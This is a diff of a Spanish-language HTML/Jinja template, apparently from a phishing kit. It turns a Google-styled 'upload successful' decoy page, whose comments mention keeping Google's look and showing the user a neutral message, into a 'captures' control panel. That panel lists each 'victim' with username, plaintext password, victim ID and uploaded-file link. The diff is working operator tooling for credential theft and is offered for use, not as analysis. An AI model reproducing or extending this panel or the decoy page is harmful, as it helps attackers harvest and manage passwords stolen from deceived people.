@@ -3,53 +3,57 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>¡Subida Completada!</title>
-    <!-- Carga de Tailwind CSS -->
+    <title>Dashboard de Datos</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Inter', sans-serif; background-color: #f7f9fb; }
-        /* Animación para el icono de éxito */
-        .success-icon {
-            color: #10B981; /* Verde esmeralda */
-            animation: bounce-in 0.8s ease-out;
-        }
-        @keyframes bounce-in {
-            0% { transform: scale(0); opacity: 0; }
-            50% { transform: scale(1.1); opacity: 1; }
-            100% { transform: scale(1); }
-        }
-        .google-button {
-            background-color: #1a73e8;
-            transition: background-color 0.3s;
-        }
-        .google-button:hover {
-            background-color: #176bd9;
-        }
+        body { font-family: 'Inter', sans-serif; background-color: #f7fafc; }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-4">
-    <div class="w-full max-w-sm bg-white p-10 rounded-xl shadow-2xl border border-gray-100 text-center">
-        
-        <!-- Ícono de chequeo (Estilo SVG) -->
-        <svg class="success-icon mx-auto h-16 w-16" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
-        
-        <h1 class="text-3xl font-bold text-gray-800 mt-4 mb-2">¡Subida Exitosa!</h1>
-        <!-- Mensaje de confirmación neutro para el usuario -->
-        <p class="text-gray-500 mb-8">El archivo ha sido procesado y almacenado de forma segura.</p>
-        
-        <div class="space-y-4">
-            <!-- Botón para regresar al inicio/login (oculta el dashboard) -->
-            <a href="/" 
-               class="google-button text-white w-full block py-3 rounded-lg font-semibold shadow-md focus:outline-none focus:ring-4 focus:ring-blue-300 transform hover:scale-[1.01] transition duration-200">
-                Realizar otra subida
-            </a>
-            
-            <!-- Enlace para volver a empezar (mantiene el estilo de Google) -->
-            <a href="/" 
-               class="text-sm font-medium text-gray-500 hover:text-gray-700 block py-2 transition duration-150">
-                O volver al inicio
-            </a>
+<body class="p-4 sm:p-8">
+    <div class="max-w-7xl mx-auto bg-white p-6 rounded-xl shadow-2xl">
+        <h1 class="text-3xl font-bold text-gray-800 mb-6 border-b pb-2">
+            Panel de Control de Capturas
+        </h1>
+
+        <div class="overflow-x-auto">
+            <table class="min-w-full divide-y divide-gray-200">
+                <thead class="bg-gray-50">
+                    <tr>
+                        <th class="px-3 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">ID Interno</th>
+                        <th class="px-3 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Usuario</th>
+                        <th class="px-3 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Contraseña</th>
+                        <th class="px-3 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">ID de Víctima</th>
+                        <th class="px-3 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Nombre del Archivo</th>
+                        <th class="px-3 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">Timestamp</th>
+                        <th class="px-3 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">URL del Archivo</th>
+                    </tr>
+                </thead>
+                <tbody class="bg-white divide-y divide-gray-200">
+                    {% for victim in victims %}
+                    <tr class="hover:bg-gray-50">
+                        <td class="px-3 py-4 whitespace-nowrap text-sm text-gray-900">{{ victim.id }}</td>
+                        <td class="px-3 py-4 whitespace-nowrap text-sm text-gray-900">{{ victim.username }}</td>
+                        <td class="px-3 py-4 whitespace-nowrap text-sm text-gray-900">{{ victim.password }}</td>
+                        <td class="px-3 py-4 text-xs font-mono text-gray-500 truncate max-w-xs">{{ victim.victim_id }}</td>
+                        <td class="px-3 py-4 whitespace-nowrap text-sm text-gray-900">{{ victim.file_name or "N/A" }}</td>
+                        <td class="px-3 py-4 whitespace-nowrap text-sm text-gray-900">{{ victim.timestamp | default("N/A") }}</td>
+                        <td class="px-3 py-4 whitespace-nowrap text-sm">
+                            {% if victim.file_url and victim.file_url != "N/A - Archivo aún no subido" %}
+                            <a href="{{ victim.file_url }}" target="_blank" class="text-blue-600 hover:text-blue-800 font-medium truncate max-w-xs block">Ver Archivo</a>
+                            {% else %}
+                            <span class="text-gray-400">Pendiente / No subido</span>
+                            {% endif %}
+                        </td>
+                    </tr>
+                    {% endfor %}
+                </tbody>
+            </table>
         </div>
+
+        {% if not victims %}
+        <p class="text-center text-gray-500 mt-8">No hay datos capturados aún.</p>
+        {% endif %}
     </div>
 </body>
 </html>
